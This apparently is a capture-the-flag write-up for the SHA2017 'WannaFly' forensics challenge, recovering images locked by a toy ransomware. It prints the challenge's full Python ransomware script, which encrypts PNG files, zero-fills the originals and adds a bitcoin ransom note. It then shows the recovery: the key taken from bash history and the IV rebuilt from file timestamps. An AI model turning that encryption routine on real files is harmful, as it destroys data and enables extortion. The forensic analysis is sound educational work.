---
layout: post
title:  "SHA2017CTF - WannaFly"
date:   2017-08-07 00:41
categories: [SHA2017CTF]
tags: [Forensics]
author: jbz
---


>My daughter Kimberly her computer got hacked. Now she lost all her favorite images. Can you please help me recover those images?
[download](https://github.com/jbzteam/CTF/blob/master/SHA2017/WannaFly/wannafly.tgz)

First of all we mounted the image with

`mount kimberly.img /mnt/tmp`

we got a bunch of "locked" images in `Pictures`

![image](https://raw.githubusercontent.com/jbzteam/CTF/master/SHA2017/WannaFly/blurried.png)

there is a file in $HOME called `...` that is the python script used to crypt the images

```
#!/usr/bin/env python

import random, string, sys, os
from time import time
from Crypto.Cipher import AES
import base64
from PIL import Image
from PIL import ImageFont
from PIL import ImageDraw
from PIL import ImageFilter
import textwrap
from io import BytesIO

IMG=""""""

MSG="""This Image is encrypted by WannaFly Ransom-ware. If you want your original image back, feel free to contact us on sha2017ctf@gmail.com and make a bitcoin payment of 0.1 bitcoin to address 1QCc1EYncxTeSfTKpaCZ2hvMDwXULKRVWe"""

def get_iv():
    iv = ""
    random.seed(int(time()))
    for i in range(0,16):
        iv += random.choice(string.letters + string.digits)
    return iv

def encrypt(m, p):
    iv=get_iv()
    aes = AES.new(p, AES.MODE_CFB, iv)
    return base64.b64encode(aes.encrypt(m))

def decrypt(m, p, i):
    aes = AES.new(p, AES.MODE_CFB, i)
    return aes.decrypt(base64.b64decode(m))

def find_images():
    i = []
    #for r, d, f in os.walk(os.environ['HOME']):
    for r, d, f in os.walk("."):
        for g in f:
            if g.endswith(".png"):
                i.append((os.path.join(r, g)))
    return i

def encrypt_images():
    for i in find_images():
        img = Image.open(i).filter(ImageFilter.GaussianBlur(radius=18))
        draw = ImageDraw.Draw(img)
        font = ImageFont.truetype("/usr/share/fonts/truetype/freefont/FreeSans.ttf", 18)
        text = textwrap.wrap(MSG, width=60)
        W, H = img.size
        bird = Image.open(BytesIO(base64.b64decode(IMG)))
        bw, bh = bird.size
        offset = ((W-bw)/2, (H-bh)/2 - 80)
        img.paste(bird, offset, bird)
        pad = 0
        for line in text:
            w, h = draw.textsize(line, font=font)
            draw.text(((W-w)/2, (H-h)/2 + pad), line, font=font, fill="white")
            pad += 20
        img.save('/tmp/sha.png')
	encrypt_image(i)

def encrypt_image(img):
    data = open(img, 'r').read()
    encrypted_img = encrypt(data, sys.argv[1])
    blurred_img = open('/tmp/sha.png', 'r').read()
    stat = os.stat(img)
    with open(img, 'r+') as of:
        of.write('\0' * stat.st_size)
        of.flush()
    open(img, 'w').write(blurred_img + "\n" + encrypted_img)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: %s <pass>" % sys.argv[0]
    else:
        encrypt_images()
```

reading the `.bash_history` we found out that the script was executed passing `Hb8jnSKzaNQr5f7p` as argument

```
cat .bash_history
ls -la
pwd
chmod +x ... Hb8jnSKzaNQr5f7p
./...  
ls -Rla
```

Well then, seems we have everything to solve this challenge they was so kind to give us the decrypt function too!

so we have 
`m` that is the image data
and `p` that is the key we found previously in `.bash_hisory`, we just need to retrive `i` that is the result of `get_iv()` that uses  `random.seed(int(time()))`that is the int value of the timestamp in the moment that the function was called, from the script we can also see that the image is blurried just after the call to `encrypt` so we can use the value of the last file edit to the image to get the seed

and here is the script we used

```
import random, string, sys, os
from Crypto.Cipher import AES
import base64

def get_iv_from_int(inte):
    iv = ""
    random.seed(inte)
    for i in range(0,16):
        iv += random.choice(string.letters + string.digits)
    return iv

def decrypt(m, p, i):
    aes = AES.new(p, AES.MODE_CFB, i)
    return aes.decrypt(base64.b64decode(m))

def find_images():
    i = []
    #for r, d, f in os.walk(os.environ['HOME']):
    for r, d, f in os.walk("."):
        for g in f:
            if g.endswith(".png"):
                i.append((os.path.join(r, g)))
    return i

if __name__ == '__main__':
    pwd = "Hb8jnSKzaNQr5f7p"
    for i in find_images():
        img = i
        print img
        stat = os.stat(img)
        ts = int(stat.st_mtime)
        
        data = open(img, 'r').read()
        end = data.index("IEND") + 9
        data = data[end:]
        
        iv = get_iv_from_int(ts)

        decrypted_img = decrypt(data, pwd, iv)
        if "IEND" in decrypted_img:
            print "ok"
            open(img+".png", 'w').write(decrypted_img)
```

the flag was inside one of the images

![flag](https://raw.githubusercontent.com/jbzteam/CTF/master/SHA2017/WannaFly/flag.jpg)
